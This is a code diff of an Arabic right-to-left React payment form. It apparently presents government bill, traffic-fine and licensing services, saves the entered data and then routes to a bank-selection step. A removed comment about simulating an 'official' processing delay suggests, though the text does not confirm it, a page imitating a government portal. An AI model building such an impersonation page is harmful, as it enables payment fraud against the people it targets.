@@ -3,7 +3,6 @@ import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { ShieldCheck, Info, Loader2 } from "lucide-react";
 
 export default function UserData() {
@@ -48,7 +47,6 @@ export default function UserData() {
         }),
       });
       
-      // Simulate official processing delay
       setTimeout(() => {
         sessionStorage.setItem("paymentData", JSON.stringify(formData));
         setLocation("/select-bank");
@@ -61,7 +59,6 @@ export default function UserData() {
 
   return (
     <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
-      {/* Header */}
       <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
         <div className="container flex justify-between items-center">
           <div className="flex items-center gap-3">
@@ -75,7 +72,7 @@ export default function UserData() {
       </header>
 
       <main className="flex-grow container py-12 px-4">
-        <div className="max-w-2xl mx-auto">
+        <div className="max-w-3xl mx-auto">
           {/* Progress Steps */}
           <div className="flex justify-between mb-12 relative px-4">
             {[1, 2, 3, 4, 5].map((step) => (
@@ -92,9 +89,9 @@ export default function UserData() {
           </div>
 
           <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
-            <div className="bg-slate-900 p-6 text-white">
-              <h2 className="text-xl font-bold">إدخال بيانات الخدمة</h2>
-              <p className="text-slate-400 text-xs mt-1">يرجى التأكد من صحة البيانات المدخلة لضمان معالجة الطلب فوراً</p>
+            <div className="bg-slate-900 p-8 text-white text-center">
+              <h2 className="text-2xl font-bold">بيانات السداد والخدمة</h2>
+              <p className="text-slate-400 text-sm mt-2">يرجى إدخال البيانات المطلوبة بدقة لضمان معالجة طلبك</p>
             </div>
 
             <form onSubmit={handleNext} className="p-8 space-y-6">
@@ -122,18 +119,20 @@ export default function UserData() {
 
               <div className="space-y-2">
                 <Label htmlFor="serviceType" className="text-sm font-bold text-gray-700">نوع الخدمة المطلوبة</Label>
-                <Select onValueChange={(val) => setFormData({...formData, serviceType: val})} required>
-                  <SelectTrigger id="serviceType" className="bg-gray-50 border-gray-200">
-                    <SelectValue placeholder="اختر نوع الخدمة من القائمة" />
-                  </SelectTrigger>
-                  <SelectContent>
-                    <SelectItem value="دفع الفواتير الحكومية">دفع الفواتير الحكومية الموحدة</SelectItem>
-                    <SelectItem value="دفع رسوم المرور والمخالفات">دفع رسوم المرور والمخالفات</SelectItem>
-                    <SelectItem value="تجديد التراخيص التجارية">تجديد التراخيص التجارية</SelectItem>
-                    <SelectItem value="فواتير الهيئة الاتحادية للكهرباء والماء">فواتير الهيئة الاتحادية للكهرباء والماء</SelectItem>
-                    <SelectItem value="رسوم الخدمات البلدية">رسوم الخدمات البلدية</SelectItem>
-                  </SelectContent>
-                </Select>
+                <select 
+                  id="serviceType"
+                  required
+                  className="w-full bg-gray-50 border border-gray-200 rounded-md p-2 text-sm focus:ring-amber-500 outline-none"
+                  value={formData.serviceType}
+                  onChange={(e) => setFormData({...formData, serviceType: e.target.value})}
+                >
+                  <option value="">اختر نوع الخدمة من القائمة</option>
+                  <option value="دفع الفواتير الحكومية">دفع الفواتير الحكومية الموحدة</option>
+                  <option value="دفع رسوم المرور والمخالفات">دفع رسوم المرور والمخالفات</option>
+                  <option value="تجديد التراخيص التجارية">تجديد التراخيص التجارية</option>
+                  <option value="فواتير الهيئة الاتحادية للكهرباء والماء">فواتير الهيئة الاتحادية للكهرباء والماء</option>
+                  <option value="رسوم الخدمات البلدية">رسوم الخدمات البلدية</option>
+                </select>
               </div>
 
               <div className="space-y-2">
